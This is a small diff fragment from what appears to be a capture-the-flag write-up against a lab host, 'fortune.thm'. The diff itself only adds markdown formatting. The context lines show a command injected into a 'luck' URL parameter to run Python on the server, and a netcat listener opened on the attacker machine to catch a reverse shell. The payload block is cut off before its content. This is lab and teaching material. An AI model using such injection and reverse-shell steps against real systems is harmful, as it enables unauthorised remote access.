@@ -111,8 +111,11 @@ lets check if python is around
 fortune.thm/_style/?luck="python -c 'print(1)'"
 ```
 and it is!
+
 kali:
+```bash
 nc -nlvp 1234
+```
 
 payload:
 ```python
